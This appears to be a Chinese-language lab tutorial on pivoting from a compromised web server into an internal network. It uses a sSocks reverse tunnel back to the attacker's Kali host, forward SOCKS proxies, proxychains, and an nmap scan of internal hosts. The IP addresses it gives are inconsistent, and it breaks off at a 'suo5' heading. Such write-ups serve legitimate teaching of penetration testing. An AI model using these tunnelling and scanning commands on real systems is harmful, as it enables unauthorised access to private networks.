代理协议：SOCKS4/5
代理服务端：可以使用代理服务程序如ssocks，也可以是MSF模块开启代理，或CS一键开启代理服务。
代理客户端软件：SocksCap Proxifier ProxyChains(linux)等。
目的：公网代理公网跳板机，使得配置 代理ip:端口 后，可通过跳板机访问内网的ip。
^

已知黑客kali主机C的IP：192.168.0.115
公网web主机A unbantu：192.168.0.144 ，其内网IP：10.10.10.129，有一个web服务/test.php
内网数据主机B：10.10.10.128 ，有一个web服务/test.php
已知已经获取了A的shell，现在要渗透获取B的shell。
![image-20211126135623062](https://image.3001.net/images/20211126/1637924059_61a0bcdb3a742d24d3320.png!small)


### ssocks

sSocks是一个socks代理工具套装，可用来开启socks代理服务

下载连接：http\://sourceforge.net/projects/ssocks

web服务器和kali都需要安装这款工具才能使用

下载之后进行编译，可以选择先下载到kali编译之后上传到web服务器，也可以直接在web服务器下载编译

```
./configure && make
```

![image-20211126143548825](https://image.3001.net/images/20211126/1637924070_61a0bce652c2cc97d3d20.png!small)

src目录中存放了编译好的文件

![image-20211126143706129](https://image.3001.net/images/20211126/1637924071_61a0bce73213dedab2011.png!small)

#### 反向代理

将远程计算机作为socks代理服务端，反弹回本地，方便内网的渗透测试

#### 1.建立隧道

kali端：

```
./rcsocks -l 1088 -p 1080 -vv

-vv 获取详细信息
等待远程Socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道，将本地的1088端口的流量转发到1080端口
```

![image-20211126145248593](https://image.3001.net/images/20211126/1637924071_61a0bce7f27cc2a1664a8.png!small)

web服务器端：

```
./rssocks -vv -s 192.168.179.128:1080
#接收192.168.179.128:1080端口的流量
```

输入命令后通道就建立完毕了

#### 2.开启代理

proxychains代理链是Linux下一款代理设置工具，kali中默认安装，ubuntu需要使用命令`apt-get install proxychains`安装

kali端修改配置文件：

```
/etc/proxychains.conf
```

注释socks4添加socks5（注意是socks5 127.0.0.1 1088下图有误）

![image-20211126145926459](https://image.3001.net/images/20211126/1637924072_61a0bce89ebe66bd0f364.png!small)

测试

```
proxychains ssh 127.0.0.1
proxychains curl http://ww.facebook.com
```

输入密码连接后，成功连接ssh，查看本机ip

![image-20211126152824274](https://image.3001.net/images/20211126/1637924073_61a0bce9311d57adf948f.png!small)

![image-20211126152726640](https://image.3001.net/images/20211126/1637924073_61a0bce9d42440974877b.png!small)

使用firefox

```
proxychains firefox 10.0.0.2
```

![image-20211126153020846](https://image.3001.net/images/20211126/1637924075_61a0bceb6af87eb8b0125.png!small)

我这边是经过了多次测试才成功，可以先试一下ssh再curl，由于Ssocks不稳定，所以不建议使用

![image-20211126155235382](https://image.3001.net/images/20211126/1637924076_61a0bceca50f603aecab1.png!small)

#### 正向代理

web服务器如下命令创建代理并监听192.168.179.147（自己的IP）

```
./ssocksd --bind 192.168.179.147 --port 6020
```

在攻击主机编辑proxychains代理配置文件，添加代理配置信息：socks5 192.168.179.147 6020

```
vi /etc/proxychains.conf
```

执行如下命令，连接内网服务器，查看ip得知代理成功。

```
proxychains ssh 127.0.0.1
```

#### 扫描内网

用kali里边的nmap扫描

```
proxychains nmap -Pn -sT 10.0.0.2
```

![image-20211126162949849](https://image.3001.net/images/20211126/1637924077_61a0bced9b776a68a958c.png!small)

^
#### HTTP端口正向代理
用suo5

